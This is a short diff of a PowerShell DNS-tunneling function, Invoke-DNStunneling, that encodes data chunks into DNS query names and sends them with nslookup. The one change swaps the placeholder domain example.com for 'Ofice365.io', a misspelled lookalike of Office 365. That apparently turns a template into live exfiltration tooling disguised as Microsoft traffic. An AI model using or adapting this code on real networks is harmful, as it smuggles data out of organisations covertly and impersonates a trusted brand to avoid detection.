@@ -39,7 +39,7 @@ function Invoke-DNStunneling {
 
     # Send each chunk as a DNS query and log the results
     foreach ($chunk in $chunks) {
-        $query = "$($chunk.Index).$($chunk.Data).example.com"  # Modify as needed to create a valid DNS name format
+        $query = "$($chunk.Index).$($chunk.Data).Ofice365.io"  # Modify as needed to create a valid DNS name format
         try {
             # Using nslookup to send DNS query and redirecting error stream to null
             $nslookupResult = nslookup -type=A $query $ServerAddress 2>$null
